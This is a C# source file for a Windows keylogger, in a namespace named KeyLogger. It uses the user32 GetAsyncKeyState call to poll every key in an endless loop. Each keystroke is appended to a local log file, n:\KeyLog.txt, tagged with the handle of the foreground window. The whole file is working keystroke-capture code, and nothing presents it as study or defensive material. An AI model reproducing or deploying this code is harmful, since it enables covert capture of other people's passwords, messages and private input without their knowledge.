using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;



namespace KeyLogger
{
    class Program        
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [DllImport("user32.dll")]
        static extern IntPtr GetActiveWindow();
        public const int WM_SYSCOMMAND = 0x0112;
        public const int SC_CLOSE = 0xF060;
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        public Int32[] iHwnd;


        static void Main(string[] args)
        {            
            LogKeys();
            //Application.Run(new  Form2api());  
            
        }

        static void LogKeys()
        {
            String path = @"n:\KeyLog.txt";
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                }
            }

            KeysConverter converter = new KeysConverter();
            String text = "";
            while (true)
            {
                Thread.Sleep(10);
                for(Int32 i = 0; i < 255; i++)
                {
                    int key = GetAsyncKeyState(i);
                    Int32 hwnd = 0;                    
                    hwnd = GetForegroundWindow().ToInt32();

                    if (key == 1 || key == -32767)
                    {
                        text = converter.ConvertToString(i);
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.WriteLine(hwnd.ToString() + "@" +  text);
                        }

                        break;
                    }
                }
            }
        }

        public void ResetInt()
        {
            Array.Clear(iHwnd, 0, iHwnd.Length);
        }

    }
}
